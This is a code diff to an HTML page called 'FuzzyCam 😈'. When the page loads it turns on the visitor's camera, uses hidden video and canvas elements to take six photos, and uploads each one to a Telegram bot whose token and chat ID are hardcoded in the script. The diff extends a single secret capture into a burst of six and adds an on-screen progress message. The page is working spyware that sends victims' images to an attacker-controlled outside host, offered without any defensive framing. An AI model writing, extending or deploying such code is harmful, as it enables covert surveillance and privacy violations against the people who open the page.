@@ -2,8 +2,24 @@
 <html>
 <head>
   <title>FuzzyCam 😈</title>
+  <style>
+    #progress {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 0, 0, 0.8);
+      color: white;
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-family: sans-serif;
+      z-index: 9999;
+      display: none;
+    }
+  </style>
 </head>
 <body>
+  <div id="progress">📸 Capturing photos...</div>
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -11,44 +27,64 @@
     const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
     const chatId = "8182050140";
 
-    async function captureAndSendPhoto() {
+    async function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function captureAndSendPhotos(count = 6) {
+      const progress = document.getElementById('progress');
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
       const context = canvas.getContext('2d');
+
+      progress.style.display = 'block';
+      progress.textContent = `📷 Accessing camera...`;
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        // Wait for camera to initialize
-        await new Promise(resolve => setTimeout(resolve, 2000));
+        await sleep(2000); // Wait for camera to initialize
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        stream.getTracks().forEach(track => track.stop()); // Stop camera
+        for (let i = 1; i <= count; i++) {
+          progress.textContent = `📸 Capturing photo ${i} of ${count}...`;
 
-        canvas.toBlob(async (blob) => {
-          const formData = new FormData();
-          formData.append('chat_id', chatId);
-          formData.append('photo', blob, 'photo.jpg');
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          await new Promise(resolve => {
+            canvas.toBlob(async (blob) => {
+              const formData = new FormData();
+              formData.append('chat_id', chatId);
+              formData.append('photo', blob, `photo_${i}.jpg`);
 
-          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: 'POST',
-            body: formData
+              await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+              });
+
+              resolve(); // Continue to next capture
+            }, 'image/jpeg');
           });
 
-          alert("❤️ Photo sent successfully 😈");
-        }, 'image/jpeg');
+          await sleep(1000); // Wait 1s before next shot
+        }
+
+        progress.textContent = "✅ All 6 photos sent!";
+        await sleep(2000);
+
+        stream.getTracks().forEach(track => track.stop()); // Stop camera
+        progress.style.display = 'none';
       } catch (e) {
-        alert("❌ Camera permission denied or error: " + e.message);
+        progress.textContent = "❌ " + e.message;
+        await sleep(3000);
+        progress.style.display = 'none';
       }
     }
 
-    // Auto start on load
     window.onload = () => {
-      captureAndSendPhoto();
+      captureAndSendPhotos();
     };
   </script>
 </body>
